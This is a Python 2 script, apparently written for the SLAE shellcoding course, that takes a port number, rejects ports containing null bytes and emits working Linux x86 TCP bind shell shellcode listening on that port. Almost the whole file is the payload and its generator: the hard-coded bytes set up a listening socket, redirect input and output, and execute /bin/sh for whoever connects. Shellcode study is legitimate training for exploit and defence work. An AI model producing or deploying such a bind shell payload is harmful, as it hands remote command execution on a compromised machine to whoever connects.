#!/usr/bin/python

# SLAE - Assignment 1 - TCP Bind Shell
# Python wrapper to change bind port in shellcode
# Author: Billy (@_hAxel)


import sys

if len(sys.argv) !=2:
	print "Incorrect usage. Use: python bindShellPortWrapper.py port number."
	print "ex. python bindShellPortWrapper.py 1337"
	exit()
try:
	port = int(sys.argv[1])
except:
	print "Incorrect usage. Use: python bindShellPortWrapper.py port number."
        print "ex. python bindShellPortWrapper.py 1337"
	exit()
	
if port not in range(1025,65536):
	print ("Invalid port. Please select a port higher that 1024" +
	       "(due to root privileges needed) and lower than 65536(invalid port).")
	exit()


portInHex = hex(port)[2:] #Convert port number to hex and strip off the 0x

if len(portInHex) < 4:
	portInHex = "0" + portInHex #Fill in placeholder zero is not present


if portInHex[0:2] == "00" or portInHex[2:4] == "00":
	print "The port number contains 00 (null bytes) and won't work for shell code."
	print "Currently, I'm to lazy to work around it, but maybe I will in a future revision."
	print "Please pick a different port."  #Time Permitting, I may look into adding a work around for null bytes
	exit()                		       #I should also probably loop back and ask for user input again instead of exiting


newPort = "\\x" + portInHex[0:2] + "\\x" + portInHex[2:4] #Format port number for shellcode

print "Creating TCP Bind Shell Shellcode for linux x86 on port " + str(port)
print "Port number formatted for the shellcode is " + str(newPort)


shellcode = ("\\x31\\xc0\\x31\\xdb\\x31\\xf6\\x31\\xff\\xb0\\x66\\xb3\\x01\\x56\\x53\\x6a" +
"\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x43\\x56\\x66\\x68" +
 newPort +"\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0" +
"\\x66\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x56\\x56" +
"\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x89\\xc3\\x31\\xc0\\xb0\\x3f" +
"\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xd2\\x31\\xc9\\x52\\x68" +
"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80")

print "\nYour new shellcode is: \n\n\"" + shellcode + "\""
	
